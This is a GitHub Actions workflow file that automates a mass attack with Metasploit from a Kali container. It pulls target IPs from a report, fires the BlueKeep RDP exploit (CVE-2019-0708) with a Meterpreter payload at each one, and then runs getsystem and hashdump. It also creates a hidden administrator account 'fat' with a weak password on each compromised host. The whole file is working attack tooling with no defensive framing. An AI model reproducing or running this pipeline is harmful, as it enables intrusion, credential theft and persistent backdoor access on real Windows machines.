name: Ultimate Exploitation and Verification

on:
  workflow_dispatch:

jobs:
  exploit_and_verify:
    runs-on: ubuntu-latest
    container:
      image: kalilinux/kali-rolling
      options: --user root

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Environment
        run: |
          apt-get update
          apt-get install -y metasploit-framework python3
          
      - name: Generate Attack and Verification Script
        run: |
          python3 - <<EOF
          import re
          import os

          report_file = "clean_report.txt"
          rc_file = "v2_attack.rc"
          
          if os.path.exists(report_file):
              with open(report_file, "r") as f:
                  content = f.read()

              ips = re.findall(r"TARGET IP\s+:\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", content)
              unique_ips = list(set(ips))

              with open(rc_file, "w") as rc:
                  rc.write("spool final_verification_report.txt\n")
                  rc.write("setg VERBOSE true\n")
                  rc.write("setg LPORT 4444\n")
                  
                  post_commands = "getsystem,hashdump,shell -c 'net user fat 123456 /add && net localgroup administrators fat /add && net user fat'"
                  rc.write(f"setg AutoRunScript multi_console_command -c \"{post_commands}\"\n")
                  
                  for target_ip in unique_ips:
                      rc.write("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
                      rc.write(f"set RHOSTS {target_ip}\n")
                      rc.write("set target 1\n")
                      rc.write("set PAYLOAD windows/x64/meterpreter/bind_tcp\n")
                      rc.write("exploit -j -z\n")
                  
                  rc.write("sleep 90\n")
                  rc.write("sessions -l\n")
                  rc.write("sessions -c 'net user fat'\n")
                  rc.write("spool off\n")
                  rc.write("exit\n")
          EOF

      - name: Execute Attack
        run: |
          msfconsole -q -r v2_attack.rc

      - name: Upload Verified Results
        uses: actions/upload-artifact@v4
        with:
          name: final-verification-log
          path: final_verification_report.txt
